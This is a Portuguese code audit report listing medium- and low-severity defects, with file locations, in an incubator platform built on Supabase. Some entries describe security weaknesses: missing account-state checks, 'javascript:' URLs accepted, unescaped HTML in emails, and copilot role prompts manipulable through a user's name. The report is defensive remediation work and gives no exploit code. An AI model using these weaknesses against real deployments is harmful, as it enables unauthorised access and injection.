| DBP-07 | Sem retenção em 8 tabelas de logs; public_booking_rate_limits guarda e-mails para sempre e a limpeza de ai_rate_limits nunca foi agendada | `supabase/migrations/20260721071618_ef6fb003-98cd-478e-9aa5-435e0e44e521.sql:104` | admin (retenção/RGPD) | P6, O3 |
| DRF-01 | A segurança e os guardas da base viva existem só em drizzle/migrations: um ambiente reconstruído do repositório nasce com leituras abertas e sem… | `.github/workflows/ci.yml:376-386` | todos; sobretudo anónimo e founder em qualquer… | Anexo R |
| DRF-05 | O gate pgTAP está partido por defeitos dos próprios testes e duas suites só correm numa base-fixture que não está no repositório | `supabase/tests/pulse_notifications_kill_switch.test.sql:46-53`, `supabase/tests/rc10_part3.test.sql:33` (+4) | engenharia/CI (job db-tests corre em main:… | P15 |
| E2E-01 | Rotas automáticas (nativa, DocuSign, PandaDoc, recuperação) não reativam um workspace arquivado: contrato ativo, workspace arquivado, alertas… | `supabase/functions/_shared/lifecycleSync.ts:263-267`, `supabase/functions/_shared/lifecycleSync.ts:272-275` (+1) | admin, backoffice, consultor (alertas); founder… | P8 |
| E2E-03 | A recuperação (reconcile-contract-activation) dá o contrato por concluído sem criar a conta do founder quando o workspace já está ativo | `supabase/functions/_shared/lifecycleSync.ts:190`, `supabase/functions/reconcile-contract-activation/index.ts:20-26` (+1) | founder (sem acesso); admin, backoffice (triagem… | P8 |
| E2E-04 | Lead contratada pela cadeia de intake fica com type='lead' e cai para sempre nos baldes comerciais da Inbox do CRM | `supabase/migrations/20261001120501_f2e2b705-92d4-4f16-8b90-524c794a6054.sql:5-56`, `src/hooks/useCrmInbox.ts:76-82` (+1) | consultor, admin, backoffice (Inbox do CRM) | P6 |
| E2E-05 | ensure_contract_workspace cria sempre uma startup nova e duplica a startup importada (mesmo NIF, workspace 'imported_unclaimed') | `supabase/migrations/20261001120501_f2e2b705-92d4-4f16-8b90-524c794a6054.sql:20-40` | admin, backoffice, consultor | P5, O1 |
| E2E-06 | Alerta 'Sincronização contratual falhou' repetido a todo o staff em cada corrida da recuperação (sem event_key) | `supabase/functions/_shared/lifecycleSyncResultHandler.ts:297-318`, `supabase/functions/reconcile-contract-activation/index.ts:20-26` | admin, consultor, backoffice | P7 |
| ED1-02 | calendar-feed publica sessões canceladas como eventos normais | `supabase/functions/calendar-feed/index.ts:150-160` | founder, team_member, consultor, admin (quem… | P10 |
| ED1-03 | analyze-contract, bulk-create-workspaces e calendar-feed ignoram o estado da conta (regra AGENTS.md): staff suspenso ou pendente continua a operar… | `supabase/functions/analyze-contract/index.ts:37-46`, `supabase/functions/bulk-create-workspaces/index.ts:27-43` (+1) | admin, consultor, backoffice com conta suspensa… | P2, P9, P10, P11 |
| ED1-04 | bulk-create-workspaces contorna o RPC atómico e deixa startups órfãs, duplicados e workspaces ativos sem membros | `supabase/functions/bulk-create-workspaces/index.ts:49-58` | admin, consultor (a função é verify_jwt=false e… | P9 |
| ED1-05 | archive-contracts-to-sharepoint: contratos podem ficar para sempre em 'uploading' e duas execuções arquivam o mesmo contrato em paralelo | `supabase/functions/archive-contracts-to-sharepoint/index.ts:97-106` | admin, backoffice (governance); sistema (cron… | P10 |
| ED2-01 | DocuSign 'Repor e reenviar' não reenvia: devolve o envelope antigo e deixa o contrato em 'dispatching' | `supabase/functions/docusign-send-envelope/index.ts:167-168`, `src/components/backoffice/contracts/ContractDetailDrawer.tsx:1067-1085` | admin, consultor, backoffice (staff que repõe);… | P7 |
| ED2-02 | docusign-send-envelope não verifica o estado da conta do staff nem compara a service key em tempo constante | `supabase/functions/docusign-send-envelope/index.ts:110` | admin, consultor, backoffice suspensos/pendentes | P7 |
| ED2-03 | docusign-send-envelope trata erro de rede e resposta 2xx ilegível como falha definitiva e liberta o claim (risco de envelope duplicado) | `supabase/functions/docusign-send-envelope/index.ts:515-585` | staff; founder signatário (duplicados) | P7 |
| ED2-05 | generate-investor-update: delta dos KPIs sai sempre null | `supabase/functions/generate-investor-update/index.ts:91-98` | founder, consultor, admin | P11 |
| ED2-06 | generate-investor-update: mentores e team_members (só leitura) regeneram e o upsert apaga o texto escrito à mão | `supabase/functions/generate-investor-update/index.ts:40-52` | mentor_externo, team_member (indevido); founder… | P11, O2 |
| ED2-07 | generate-progress-report-pdf: totais de ações e milestones cortados a 50/20 linhas sem ordem | `supabase/functions/generate-progress-report-pdf/index.ts:116-126` | founder, consultor, admin, team_member,… | P11 |
| ED3-02 | bulk-import-commit: sem reclamação atómica das linhas, um segundo pedido duplica startups, workspaces e contratos | `supabase/functions/bulk-import-commit/index.ts:85-87` | admin | P5 |
| ED3-03 | bulk-import-commit: sem start_date o contrato falha depois de criar startup e workspace (órfãos), e vários updates ignoram o erro | `supabase/functions/bulk-import-commit/index.ts:177` | admin | P5 |
| ED3-04 | dataroom-get-by-token: o contador de acessos nunca grava (NaN vira null e viola NOT NULL) | `supabase/functions/dataroom-get-by-token/index.ts:95-110` | anónimo (investidor), founder, staff | P11 |
| ED3-05 | Data room: um item pode apontar para documento ou atualização de outro workspace e a edge function assina o URL com service role | `supabase/functions/dataroom-get-by-token/index.ts:135-151` | founder, team_member, consultor (escrita);… | P5, P11, O1 |
| ED3-06 | generate-board-pack: admin suspenso ou pendente ainda gera o relatório (falta isAccountActive) | `supabase/functions/generate-board-pack/index.ts:33-44` | admin (suspenso/pendente) | P11 |
| ED3-07 | generate-board-pack: erros de leitura viram zeros no relatório, contagens limitadas a 1000 linhas e métricas mal definidas | `supabase/functions/generate-board-pack/index.ts:48-64` | admin | P11 |
| ED3-08 | compute-cohort-benchmarks: leitura truncada a 1000 linhas e substituição não atómica (delete seguido de insert) | `supabase/functions/compute-cohort-benchmarks/index.ts:50-54` | admin, backoffice (cron), founder/mentor… | P11 |
| ED3-09 | analyze-pitch-deck: a 'análise' nunca lê o ficheiro e as notas inventadas ficam gravadas como avaliação | `supabase/functions/analyze-pitch-deck/index.ts:46-52`, `src/components/workspace/DocumentReviewPanel.tsx:70-95` | admin, consultor, mentor_externo | P11 |
| ED4-01 | automation-engine: o filtro de leads paradas usa estados em português que não existem e notifica diariamente leads contratadas, rejeitadas,… | `supabase/functions/automation-engine/index.ts:482` | consultor, admin (donos das leads) | P10 |
| ED4-02 | automation-engine: avisos de contrato, check-in, KPI, milestone e workspace sem consultor ignoram workspace_users.active e enviam dados comerciais a… | `supabase/functions/automation-engine/index.ts:355` | mentor_externo, ex-membros (active=false), admin | P10 |
| ED4-03 | automation-engine: nomes interpolados sem escape no HTML dos e-mails; o nome de um registo anónimo chega aos admins | `supabase/functions/automation-engine/index.ts:211` | admin (destinatário), anónimo no registo,… | P10 |
| ED4-04 | check-mentor-nda-expiry: avisa mentores de uma expiração do NDA que não existe e o botão "Renovar NDA" aponta para uma rota inexistente | `supabase/functions/check-mentor-nda-expiry/index.ts:18-19` | mentor_externo, admin | P10 |
| ED4-05 | Validação de slot do consultor: sessões de 90 e 120 min dão sempre "ocupado" e um dia todo ocupado dá "disponível" | `src/hooks/useConsultantCalendar.ts:71-90`, `supabase/functions/check-consultant-availability/index.ts:187-224` | founder, consultor, admin (marcar sessão com… | P8 |
| ED4-06 | check-consultant-availability: com availabilityView vazia ou erro do Graph, todos os slots saem como livres (contradiz a regra "não adivinhar") | `supabase/functions/check-consultant-availability/index.ts:332-348` | founder, consultor (marcar sessão), consultor… | P8 |
| ED4-07 | commit-hubspot-history-import: correspondência "exata" usa ilike com curingas, adivinha entre duplicados e aceita entradas sem external_id | `supabase/functions/commit-hubspot-history-import/index.ts:44-62` | admin | P9 |
| ED4-08 | withCronRunLogging: qualquer pedido anónimo às 16 funções cron grava uma linha em cron_job_runs (e forja triggered_by='cron') | `supabase/functions/_shared/cronRun.ts:124-145` | anónimo | P10 |
| ED4-09 | analyze-contract-document, bulk-import-extract e census-run usam o service role sem verificar o estado da conta | `supabase/functions/analyze-contract-document/index.ts:33-46`, `supabase/functions/bulk-import-extract/index.ts:73-89` (+1) | staff suspenso, admin suspenso | P2, P9, P11 |
| FEB-02 | Sub-separador do Backoffice não segue o URL: 'Espaços', 'Contratos', lista de espera, cartões do hub e links ?section= não funcionam | `src/components/admin/AdminBackoffice.tsx:76-86`, `src/components/layout/AppSidebar.tsx:173` (+6) | backoffice, admin (e consultor na paleta/mobile) | P3, P12, P14 |
| FEB-03 | Separador Relatórios mostra zeros ao backoffice e o CSV sai vazio (RLS não dá action_items/milestones/sessions/kpi_values) | `src/pages/Admin.tsx:74`, `src/pages/Admin.tsx:294-304` (+2) | backoffice | P14 |
| FEB-04 | Relatório CSV e analytics truncam a 1000 linhas, ignoram erros e usam serializer próprio; filtro de programa nunca é preenchido | `src/components/analytics/BulkReportGenerator.tsx:27-136`, `src/hooks/useCohortAnalytics.ts:35-62` | admin, consultor | P14 |
| FEB-06 | Leituras falhadas aparecem como 0 ou como 'Sem Candidaturas Pendentes' (regressão da regra 'estatísticas falhadas são erro') | `src/components/admin/PendingApprovalsManager.tsx:258-260`, `src/hooks/useBackofficeCommandCenter.ts:61-93` (+2) | backoffice, admin | P3 |
| FEB-07 | Gestão de utilizadores depende do limite implícito de 1000 linhas em profiles e user_roles | `src/hooks/useAdminData.ts:145-176`, `src/components/admin/AdminUsersManager.tsx:44-45` | admin | P4 |
| FEF-01 | Banner de check-in mostrado a team_member: 'Saltar' anuncia sucesso sem efeito e 'Concluir' devolve Access denied | `src/components/workspace/WorkspaceOverview.tsx:352`, `src/hooks/useCheckins.ts:356-373` (+1) | team_member (com papel global founder); founder… | P13 |
| FEF-02 | Ações da sessão e exportação de ações usam um embed PostgREST inexistente (PGRST200) e falham em silêncio | `src/hooks/useSessions.ts:711-718`, `src/hooks/useExportData.ts:144-153` (+2) | founder, team_member, consultor, admin (qualquer… | P4 |
| FEF-04 | Founder e team_member leem as notas internas do staff (workspaces.health_notes e priority_notes); health_notes aparece na UI como 'Insight IA' | `src/components/workspace/JourneyHeader.tsx:150-153`, `src/hooks/useWorkspaces.ts:81-82` (+1) | founder, team_member | P12 |
| FES-01 | Pesquisa global: termo com vírgula rebenta 8 pesquisas e o erro é engolido | `src/hooks/useGlobalSearch.ts:84` | admin, consultor, backoffice, founder,… | P12 |
| FES-02 | Resultados da pesquisa abrem páginas que ignoram o parâmetro (lead, pessoa, startup sem workspace) | `src/hooks/useGlobalSearch.ts:448` | admin, consultor (leads e pessoas); founder… | P12 |
| FES-03 | Paleta Ctrl+K esconde no cliente resultados que o servidor encontrou | `src/components/command/CommandPalette.tsx:215`, `src/components/ui/command.tsx:24-30` | todos os papéis autenticados | P1, P13 |
| FES-04 | Mentor: 'Nota Rápida' falha sempre (RLS e valor de visibilidade inválido) | `src/components/mentor/QuickNoteDialog.tsx:41-48`, `src/components/dashboard/MentorDashboard.tsx:638` | mentor_externo | P5, P12 |
| FES-05 | Ações da sessão, exportação de ações e Prep Sheet usam embeds sem relação no PostgREST | `src/hooks/useSessions.ts:711-715`, `src/hooks/useExportData.ts:144-153` (+1) | consultor, admin (SessionDetailDialog e Prep… | P4, P12 |
| FES-06 | Ecossistema: filtro de saúde inclui todas as leads (e o total) | `src/hooks/useEcosystemItems.ts:111`, `src/components/admin/EcosystemHeatmap.tsx:134` (+1) | admin, consultor | P12 |
| FES-07 | Fila de trabalho: 'concluídos' sem limite e 'Todos' que não é todos | `src/hooks/useWorkQueue.ts:50-58`, `src/components/staff/DayCompleteRing.tsx:14` (+1) | admin, consultor, backoffice | P12 |
| FES-08 | Documentos (staff) abre `external_url` sem validar o esquema; a base aceita `javascript:` | `src/pages/Documents.tsx:99-101`, `src/components/workspace/actions/ActionItemCard.tsx:271` | founder/team_member (escreve), admin e consultor… | P1, P4, O1 |
| FEX-01 | URLs escritas por utilizadores renderizadas como href/window.open sem safeExternalHref (javascript: aceite pela base) | `src/pages/UserProfile.tsx:98`, `src/pages/MentorProfile.tsx:98` (+7) | founder, team_member, mentor_externo escrevem;… | P1, P3, P4, P5 |
| FEX-03 | Timeout de inatividade de um separador faz signOut global e expulsa o utilizador que trabalha noutro separador ou dispositivo | `src/components/auth/SessionTimeoutWarning.tsx:31-96`, `src/App.tsx:172` (+1) | todos os autenticados (staff com vários… | P6 |
| FEX-04 | Pesquisa global (Ctrl+K e /search) devolve vazio para qualquer termo com vírgula e ignora erros das fontes | `src/hooks/useGlobalSearch.ts:50` | todos (staff mais afetado: 'Silva, Lda', 'Acme,… | P12 |
| FEX-05 | Notificações geradas pelo servidor apontam para rotas/separadores que não existem (/dashboard, /dashboard?pulse=, /admin?tab=contracts) | `supabase/migrations/20260907175945_4b4f2805-253b-4073-9986-ab23df8f1f3b.sql:158`, `supabase/functions/public-book-first-contact/index.ts:741` (+3) | founder (pulse mensal e primeiro contacto),… | P6, P8, P10, P14 |
| FEX-06 | Definições › Palavra-passe altera a palavra-passe sem pedir a atual (reautenticação em falta) | `src/pages/Settings.tsx:76` | todos | P7 |
| HRD-01 | Timeout global de 30 s no cliente corta uploads, IA e importações enquanto o servidor continua | `src/lib/fetchWithTimeout.ts:2-17`, `src/lib/supabaseClient.ts:36` | todos (founder, consultor, admin, backoffice,… | P6 |
| HRD-02 | 17 endpoints com service role autorizam só por user_roles: admin/consultor suspenso ou pendente continua a operar | `supabase/functions/set-global-integrations/index.ts:53` | admin, consultor, backoffice suspensos ou… | P2, P9 |
| HRD-03 | Webhook que fica em 'received' (função morta ou exceção) é depois ignorado como duplicado e o evento perde-se | `supabase/functions/_shared/webhookInbox.ts:122-131`, `supabase/functions/docusign-webhook/index.ts:507-512` (+1) | backoffice, admin (contratos assinados que não… | P7 |
| HRD-04 | Emails do automation-engine e do check-mentor-nda-expiry inserem nomes sem escape (injeção de HTML nos admins) | `supabase/functions/automation-engine/index.ts:196`, `supabase/functions/check-mentor-nda-expiry/index.ts:54` | admin (recetor); qualquer utilizador que se… | P10 |
| HRD-05 | Estatísticas ainda fabricam zeros quando a consulta falha (regra aplicada só ao dashboard admin) | `src/components/admin/EcosystemPulseCard.tsx:49-51`, `src/components/admin/EnrollmentControlCenter.tsx:44-46` (+2) | admin, backoffice, consultor | P1, P3, P14 |
| HRD-06 | Aceitar um convite não reativa um membro inativo: devolve sucesso mas o utilizador continua sem acesso | `supabase/migrations/20260806110507_ed501453-24ce-4b14-905c-35ac1070cc1c.sql:66-71` | founder, team_member reconvidados;… | P5 |
| HRD-07 | Copilot: respostas cortadas aos 25 s, histórico envenenado por uma resposta longa e papéis lidos de texto controlável | `src/hooks/useCopilotChat.ts:14`, `supabase/functions/_shared/copilotInput.ts:8-13` (+1) | todos os que usam o copilot | P2 |
| ONB-01 | Atribuir workspace a conta pendente ('Associar') e criar workspace para um claim rebentam sempre (regressão RC11 B4/B5) | `supabase/migrations/20261019110000_rc11_part_b.sql:332`, `supabase/migrations/20261019110000_rc11_part_b.sql:346` (+4) | admin, consultor (quem atribui); founders novos… | P5 |
| ONB-03 | send-workspace-invite não verifica se a conta de quem convida está ativa | `supabase/functions/send-workspace-invite/index.ts:108-122` | admin, consultor, backoffice suspensos | P9 |
| ONB-04 | Contas pendentes, suspensas e mentores atribuem-se o papel founder e criam candidaturas por RPC | `supabase/migrations/20260107171046_04975e4a-bb21-40b6-93fa-67bd2d388892.sql:4-18`, `supabase/migrations/20260712221525_3984115e-a4e3-440a-aa95-a0bfdff188af.sql:166-168` | contas pendentes, suspensas e mentor_externo;… | P5 |
| ONB-05 | A atribuição de workspace e a aprovação de claim apagam needs_onboarding: o founder não preenche a Empresa e fica sem poder editar o NIF | `supabase/migrations/20260416085121_c5458444-d147-4858-a17d-7bfc29be0ed6.sql:45`, `supabase/migrations/20260416085121_c5458444-d147-4858-a17d-7bfc29be0ed6.sql:60` (+1) | admin, consultor (atribuem); founders atribuídos… | P5 |
| ONB-06 | reconcile_contract_founders (cron horário e trigger) reatribui papel founder e adesão a contas suspensas ou eliminadas | `supabase/migrations/20261001120000_rc10_part1_chain.sql:150-167`, `supabase/migrations/20261019110000_rc11_part_b.sql:451-473` | founders suspensos ou eliminados; equipa | P5 |
| OPS-01 | Os alertas dos monitores (system_alerts) não são lidos por ninguém: nem ecrã, nem notificação, nem email | `src/components/admin/SystemHealthDashboard.tsx:234-300`, `supabase/migrations/20260907175945_4b4f2805-253b-4073-9986-ab23df8f1f3b.sql` (+1) | admin, consultor (afeta quem opera a plataforma) | P6, P13 |
| OPS-02 | A tabela integration_errors nunca existiu: 4 funções escrevem para o vazio e o painel mostra 'tudo bem' a verde | `src/components/admin/IntegrationErrorsPanel.tsx:41`, `src/hooks/useIntegrationErrors.ts:29` (+4) | admin (Definições → Integrações) | P6, P10, P13 |
| OPS-04 | Basta uma caixa de correio Outlook a falhar para o monitor de sync-outlook-emails dar alerta 'high' falso e estado UNKNOWN | `supabase/functions/sync-outlook-emails/index.ts:743-745`, `supabase/functions/_shared/cronRun.ts:151-152` (+1) | admin, consultor | P6 |
| OPS-06 | CI: pgTAP local e 161 testes Deno nunca correm; db-tests, i18n-lint e i18n-sync-guard estão vermelhos no main | `.github/workflows/ci.yml:355-386`, `supabase/functions/deno.json:6-10` | equipa técnica / quem publica | P15 |
| RV-01 | bulk-import-commit: o contrato 'active' por omissão é recusado pelo trigger guard_contract_integrity, deixando startup e workspace órfãos em todas… | `supabase/functions/bulk-import-commit/index.ts:254` |  | P5 |
| RV-02 | Formulário de contrato do backoffice oferece o estado 'Ativo', mas o trigger guard_contract_integrity recusa sempre a criação (erro genérico) | `src/components/backoffice/contracts/ContractReviewForm.tsx:20`, `src/hooks/backoffice/useContracts.ts:83-99` |  | P7 |
| RV-03 | Teste pgTAP do kill-switch dos pulses com erro de sintaxe (db-tests vermelho) | `supabase/tests/pulse_notifications_kill_switch.test.sql:46-53` |  | P15 |
| SCH-01 | 6 upserts de notificações falham sempre com 42P10: o índice único (user_id,event_key) é parcial | `src/hooks/useTemplateRequests.ts:115`, `src/hooks/useTemplateRequests.ts:143` (+5) | founder, consultor, admin, team_member (recebem… | P1, P6 |
| SCH-02 | Tabela integration_errors não existe: 5 edge functions perdem os erros e o painel de Sistema mostra 'tudo a funcionar' | `src/hooks/useIntegrationErrors.ts:29`, `src/hooks/useIntegrationErrors.ts:54` (+8) | admin (painel Sistema > Integrações), todas as… | P6, P10, P13 |
| SCH-03 | 'Nota rápida' do mentor nunca grava: visibility 'team' viola o CHECK e o mentor não tem política de INSERT | `src/components/mentor/QuickNoteDialog.tsx:41-47`, `src/components/dashboard/MentorDashboard.tsx:638` (+1) | mentor_externo (com NDA); staff deixa de ver as… | P5, P12, O1 |
| SCH-04 | Automação 'intake incompleto 7 dias' nunca corre: literais 'pending_documents'/'draft' não existem no enum intake_status | `supabase/functions/automation-engine/index.ts:581-586` | staff atribuído ao intake (consultor/admin) | P10 |
| SCH-05 | census-run devolve sempre 500 'census_query_failed': pede workspaces.name, que não existe | `supabase/functions/census-run/index.ts:301`, `supabase/functions/census-run/index.ts:378` (+1) | admin (Censo de reconciliação) | P9 |
| SCH-06 | FK inexistente action_items_owner_user_id_fkey: ações da sessão e exportação de ações dão sempre erro | `src/hooks/useSessions.ts:711-716`, `src/hooks/useExportData.ts:143-157` | staff e founder (detalhe de sessão), staff e… | P4 |
| SCH-07 | FirstContactPrepSheet: lista de membros sempre vazia e campos 'Setor'/'Modelo' que não existem em lado nenhum | `src/components/consultor/FirstContactPrepSheet.tsx:43` | consultor, admin, mentor (usam a ficha de… | P12 |
| SCH-08 | generate-template-coach e analyze-template pedem startups.industry: o contexto da startup (e os KPIs do programa) perde-se | `supabase/functions/generate-template-coach/index.ts:94-98`, `supabase/functions/analyze-template/index.ts:90-94` | founder e team_member (coach de templates),… | P11 |
| SIGN-01 | Falha ou resposta ambígua do DocuSign/PandaDoc aparece como «enviado»; contrato preso em «dispatching»/«failed» e intake preso em «signature_sent» | `supabase/functions/public-contract-onboarding/index.ts:226-235`, `supabase/functions/docusign-send-envelope/index.ts:519-540` (+3) | admin, backoffice, consultor (painel do intake),… | P8, P9 |
| SIGN-02 | Webhook que cai depois de reclamar o evento deixa o inbox em 'received' e o retry do fornecedor é dado como duplicado (assinatura perdida) | `supabase/functions/_shared/webhookInbox.ts:120-131`, `supabase/functions/docusign-webhook/index.ts:507-513` (+1) | sistema (DocuSign, PandaDoc); afeta founder e… | P7 |
| SIGN-03 | docusign-send-envelope, pandadoc-send-document e generate-contract-pdf aceitam staff com conta suspensa ou pendente | `supabase/functions/docusign-send-envelope/index.ts:122-135`, `supabase/functions/pandadoc-send-document/index.ts:46-59` (+1) | consultor, backoffice, admin com… | P7 |
| SIGN-04 | «Repor e reenviar» mantém regulation_accepted_at: o link da nova ronda salta para a assinatura sem dados nem Regulamento (A3/SIGN-05 reaberto) | `src/components/backoffice/contracts/ContractDetailDrawer.tsx:1067-1086`, `src/pages/PublicContractSigning.tsx:221-226` (+1) | founder (link público), consultor, backoffice,… | P7 |

## 7. Defeitos LOW (138)

| ID | Defeito | Parte |
|---|---|---|
| CRM-05 | C12 aplicado em excesso: o escape HTML também entra em títulos de notificações, assuntos de email e no assunto do evento Teams | P8 |
| CRM-06 | Assunto do email do pedido de intake com escape HTML; recipients do email_log gravado como string JSON | O2 |
| CRM-08 | O lembrete de assinatura herda os contadores da fase de preenchimento e pode sair logo a seguir ao envio do contrato | O1 |
| CRM-09 | O lembrete de 'Correções pedidas' não leva as notas das correções | O1 |
| CRM-10 | Formulário público de intake: erros de validação do servidor nunca chegam ao founder e 'link expirado' nunca é reconhecido | P9 |
| CRM-11 | Criar tarefa com data apaga a próxima ação mais próxima da lead | P9 |
| CRM-12 | Separador Tarefas do CRM mostra 'sem tarefas' quando a consulta falha | P14 |
| CRM-13 | Conversão pelo backoffice perde o pitch deck do formulário público em silêncio | P1 |
| DBP-03 | sync-graph-email-history em modo real falha em todas as mensagens (upsert sobre índice parcial) | P1, O2 |
| DBP-04 | Políticas RLS chamam funções SECURITY DEFINER aninhadas por linha: listagens lentas (segundos) | O1 |
| DBP-06 | 44 índices duplicados ou cobertos por prefixo (inclui 3 índices únicos equivalentes em communication_log) | P6 |
| DBP-08 | idx_client_error_logs_message (btree sobre texto livre) rejeita mensagens grandes | P6 |
| DBP-09 | Tabela de backup template_instances_dedup_backup_20260516 ainda existe, com conteúdo de founders | decisão |
| DBP-10 | 11 tabelas com updated_at que nunca avança em UPDATE | O1 |
| DBP-11 | Colunas *_id sem chave estrangeira (órfãos possíveis) e uma FK NO ACTION para auth.users | O1 |
| DBP-12 | Dois triggers em auth.users chamam handle_new_user_role | O1 |
| DRF-02 | Objetos que existem na produção (types.ts) e não estão em NENHUMA migração, nem em drizzle: 3 objetos inteiros, 1 tabela com colunas trocadas e 10 NOT NULL | Anexo R |
| DRF-03 | O replay em Postgres anterior ao 17 falha por inteiro (SET transaction_timeout na baseline); o harness local e o CI não o tratam | O3 |
| DRF-04 | Ordem de aplicação e não idempotência: re-correr rc11_part_b depois da drizzle 0013 reverte account_not_suspended; os patches drizzle 0011/0017/0018 duplicam ou… | Anexo R |
| DRF-06 | Migrações retroativas ou neutralizadas: o repositório não é exatamente o que a base executou e o `db push` pode recusar a ordem | Anexo R |
| E2E-07 | A triagem 'Convidar founder' só se fecha se o motivo for 'missing_auth_user'; as outras ficam abertas depois de a conta ser ligada | P7 |
| E2E-08 | Webhooks DocuSign e PandaDoc: emails 'contrato assinado/ativado' e activity_log ignoram o workspace criado na assinatura | P8 |
| E2E-09 | O founder criado na assinatura recebe dois emails em segundos: acesso e 'contrato ativo, entre com a sua conta habitual' | P8 |
| E2E-10 | syncIntakeOnCompleted força a lead para 'contracted' mesmo que esteja em incubating, accelerating, archived ou rejected | P8 |
| E2E-11 | RC10 A3 mal aplicado: submit_signing regista a aceitação do Regulamento sem confirmação do founder | P8 |
| E2E-13 | staff-assign-workspace-to-contract: o mesmo guarda de program_id repetido três vezes (código duplicado) | O1 |
| ED1-06 | calendar-feed gera ICS fora do RFC 5545 (descrição com \\n literal, linhas em branco, LF, sem dobragem) e aceita URLs arbitrários | P10 |
| ED1-07 | archive-contracts-to-sharepoint: URL do Graph sem codificação ('#' e '%' no nome da organização) e fetch(document_url) sem restrições nem timeout | P10 |
| ED1-08 | check-missed-milestones: o 2.º marco em atraso do mesmo workspace perde o item da fila do staff (índice único) e o teams-notify pode bloquear o cron | O2 |
| ED1-09 | copilot-apply-playbook: o preflight não reflete o RLS (team_member e backoffice recebem 500 com texto de RLS) e reaplicar o playbook devolve 500 com o nome da constraint | O2 |
| ED1-10 | commit-crm-import: sem reclamação atómica do job, row_ids vazio comita tudo e corpo inválido dá 500 | O1 |
| ED1-11 | createLogger().error imprime [object Object] em 13 chamadores (analyze-contract, entre outros) e analyze-contract não tem limite de pedidos de IA nem valida a entrada | P11, O2 |
| ED2-04 | docusign-send-envelope não liberta o claim quando a autenticação DocuSign falha (contrato fica 'dispatching') | P7 |
| ED2-08 | generate-progress-report-pdf: sessões do último dia do mês omitidas, JSON/UUID/mês sem validação e valores sem escape | P11 |
| ED2-09 | export-cohort-health-pdf: histórico truncado a 1000 linhas, erros de consulta ignorados e sem verificação de conta | P11, O2 |
| ED2-10 | apply-survey-responses lê a BD antes de autenticar e compara x-cron-secret com === | O2 |
| ED2-11 | apply-survey-responses: reexecução destrói a auditoria 'applied', grava no mês de agora e ignora erros da auditoria | O2 |
| ED2-12 | apply-survey-responses: marco duplicado por wildcards do ilike e maybeSingle com 2+ linhas | O2 |
| ED2-13 | accept-mentor-nda reescreve a data e o IP do 1.º aceite em cada chamada; hash de IP com sal fixo | O1 |
| ED2-14 | commit-hubspot-import: dupla invocação duplica funnel_items; aceita jobs não HubSpot; job pode ficar em 'committing' | O1 |
| ED2-15 | accept-workspace-invite: convite já aceite devolve workspace_id/startup_id a qualquer sessão; corpo JSON inválido dá 500 | P5, O1 |
| ED3-10 | analyze-pitch-deck: sem conta ativa, sem limite de IA, sem validar UUID e devolve a mensagem de erro interna | P11 |
| ED3-11 | withCronRunLogging regista em cron_job_runs todos os pedidos 401/403, incluindo anónimos a funções com verify_jwt=false | P10 |
| ED3-12 | copilot-chat: utilizadores sem workspace_users (staff, founders pré-claim) não têm limite de pedidos de IA | P2 |
| ED3-13 | copilot-chat: histórico sem teto e conversa bloqueada quando uma resposta do assistente passa 4000 caracteres | P2 |
| ED3-14 | copilot-chat: os papéis usados para o guia do prompt são lidos por regex do texto, manipulável com full_name | P2 |
| ED3-15 | dataroom-revoke-link: revogar de novo reescreve a data da revogação original | O2 |
| ED4-10 | analyze-contract-document: o registo de auditoria nunca é gravado e a entrada não é validada | P11 |
| ED4-11 | createLogger.error perde os dados quando recebe um objeto no 2.º argumento (errMsg "[object Object]") | O2 |
| ED4-12 | census-run: CSV de exceções sem neutralização de fórmulas e leituras truncadas a 1000 linhas | P9 |
| ED4-13 | bulk-import-leads: CSV do Excel com ';' é recusado, valores em formato PT são lidos mal e as linhas além de 5000 desaparecem sem aviso | P9 |
| ED4-14 | automation-engine: falhas de envio de e-mail invisíveis, corrida cron+manual aborta a verificação e um run manual conta como heartbeat do cron | P10 |
| ED4-15 | automation-engine: "KPIs desatualizados" dispara em workspaces com menos de 2 meses | P10 |
| ED4-16 | bulk-import-extract: reextrai linhas já aplicadas, o travão de emergência falha aberto e o nome é comparado com curingas | P9 |
| FEB-05 | Mission Control mostra ao backoffice (e consultor) entradas que a página ignora: botões mortos | P14 |
| FEB-08 | i18n-lint falha: 8 chaves em falta em PendingApprovalsManager (pt/en) e textos fixos no mesmo ecrã | P13 |
| FEB-09 | Locale en.json contém textos em português nesta fatia (17 chaves) | O1 |
| FEB-10 | Outras leituras falhadas mascaradas: kill switch de notificações, Lifecycle Hub (spinner infinito) e lista de contratos | P3 |
| FEB-11 | AppDiagnostics: sondas de 'RLS' escrevem em dados reais e passam sempre | P13 |
| FEB-12 | Criação de contrato no backoffice: espelho de desconto e ligações ao CRM/intake falham em silêncio | P13 |
| FEB-13 | Acessibilidade: remoção de função só por clique em Badge, interruptores sem nome, botão invisível por teclado, links só-ícone | P4, P13 |
| FEB-14 | AdminUsersManager repõe a página 1 dentro de useMemo (setState durante o render) | P4, P13 |
| FEB-15 | AdminDatarooms ignora erros: NDA lido mal vira 'NDA pendente' e remoção de mentor deixa-o associado às startups | P13 |
| FEB-16 | Aprovações não atualizam os contadores do menu, do cartão de pulso e do painel | P3, P13 |
| FEF-05 | Com localStorage ou sessionStorage bloqueados, todas as páginas lazy e o painel do founder deixam de abrir | P7, P12 |
| FEF-06 | Plurais quebrados: 26 chaves usam o formato legado X_plural, ignorado com compatibilityJSON 'v4' | O1 |
| FEF-07 | Textos fixos em inglês e enums crus em componentes da fatia; rota órfã /workspace/:id/value-prop | P4 |
| FEF-08 | Gate i18n:lint falha por 8 chaves em falta em PendingApprovalsManager (confirmado) | P13 |
| FEF-09 | URLs escritas por founders são usadas em href e window.open sem sanitizar (a BD aceita javascript:) | P4 |
| FEF-10 | Separadores Equipa e Financiamento mostrados a team_member com papel global founder; Financiamento sem controlo de escrita | P13 |
| FEF-11 | Gatilho block_founder_notifications não acompanhou a correção D.9 do RC11: team_member sem papel global continua a receber notificações com o interruptor ligado | O1 |
| FES-09 | Gate i18n:lint falha: 8 chaves em falta em PendingApprovalsManager (visível no Painel do consultor) | P13, O1 |
| FES-10 | Ecossistema: ordenar por 'Saúde' não faz nada | P12 |
| FES-11 | Ligações mortas ou erradas: Acesso Rápido, Primeiros passos, Recursos, transferência de programa, paleta | P12, P13 |
| FES-12 | Página /staff/impact sem nenhuma ligação e com intervalo por omissão errado no verão | P13 |
| FES-13 | Cartões e listas do staff mostram erro como 'vazio' ou 0 | P13 |
| FES-14 | Textos fixos e acessibilidade no Painel, Pesquisa e Copilot | P2, P13 |
| FES-15 | Copilot: timeout total corta respostas longas e um erro de rede desliga o assistente | P2 |
